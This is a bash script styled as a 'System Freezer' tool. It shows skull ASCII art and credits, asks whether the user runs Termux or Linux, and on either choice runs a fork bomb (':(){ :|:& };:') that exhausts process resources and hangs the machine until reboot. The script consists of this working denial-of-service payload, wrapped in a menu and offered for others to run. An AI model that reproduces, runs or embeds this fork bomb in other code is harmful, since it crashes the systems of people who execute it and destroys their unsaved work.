#!/bin/bash

#ANSII COLOR CODES
Light_Magenta="\e[95m"
NONE='\033[00m'
RED='\033[01;31m'
GREEN='\033[01;32m'
YELLOW='\033[01;33m'
PURPLE='\033[01;35m'
CYAN='\033[01;36m'
WHITE='\033[01;37m'
BOLD='\033[1m'
UNDERLINE='\033[4m'






echo -e '\e[96m
                         __________
                      .~#########%%;~.
                     /############%%;`\
                    /######/~\/~\%%;,;,\
                   |#######\    /;;;;.,.|
                   |#########\/%;;;;;.,.|
          XX       |##/~~\####%;;;/~~\;,|       XX
        XX..X      |#|  o  \##%;/  o  |.|      X..XX
      XX.....X     |##\____/##%;\____/.,|     X.....XX
 XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ >     X  \...X
 X# \.X        @#%,.@     WLS-SD     @#%,.@.          X# \.X
                @#%,.@              @#%,.@.
                  @#%,.@          @#%,.@
                     @#%,.@      @#%,.@
                       @#%.,@  @#%,.@
                        System Freezer


'

GREEN="\e[92m"
printf "${GREEN}"

sleep 0.2

figlet -f standard "TOOL_by"

sleep 0.2

figlet -f standard "WLS"

sleep 0.2

echo "This Tool is Developed by https://github.com/WLS-SD under GNU GENERAL PUBLIC LICENSE Version 3."


echo -e "${BOLD} ${GREEN} Please Choose Your System :~~-"
echo -e "${PURPLE} 1. Termux (Android)"
echo -e "${PURPLE} 2. Linux OS (Works on ALL Distros,Especially on Debian Based"



printf "${GREEN}"
echo -n "Your System :~~"
read selected_os

if [ $selected_os = 1 ]
then

printf "${CYAN}"
echo "You Have Selected Termux(Android)"
echo "This Tool Will Freeze Your System So Reboot Your System"
:(){ :|:& };:


elif [ $selected_os = 2 ]
then

printf "${CYAN}"

echo " You Have Selected Linux Os"
echo "This Tool Will Freeze Your System So Reboot Your System"
:(){ :|:& };:

else

printf "${CYAN}"

echo 'Invalid Option !!!'
echo 'Please Choose 1 For Termux(Android) & 2 For Linux Os.'

fi
